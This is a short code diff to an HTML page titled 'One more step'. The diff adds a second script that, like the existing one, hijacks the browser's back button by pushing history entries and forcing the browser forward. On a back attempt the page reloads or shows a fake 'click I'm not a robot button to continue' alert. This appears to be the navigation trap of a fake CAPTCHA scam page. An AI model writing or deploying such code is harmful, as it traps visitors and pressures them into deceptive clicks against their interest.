@@ -7,6 +7,10 @@
 <title>One more step</title>
 
 <script>
+if(sessionStorage["click"]) { window.history.forward(); function preventBack() { window.history.forward(); } setTimeout("preventBack()", 0); } else { history.pushState(null, null, window.location.href); history.back(); window.onpopstate = () => history.forward(); }
+</script>
+
+<script>
 if(sessionStorage["click"]) { window.history.forward(); function preventBack() { window.history.forward(); } setTimeout("preventBack()", 0); } else { history.pushState(null, null, document.URL); window.addEventListener('popstate', function () { history.pushState(null, null, document.URL); if(navigator.userAgent.match(/firefox|fxios/i)) { setTimeout(function scrollA() { window.scrollTo(0, 0); }, 200); location.reload(); } else { setTimeout(function scrollB() { window.scrollTo(0, 0); }, 200); alert("Please click I'm not a robot button to continue !"); }; }); }
 </script>
 
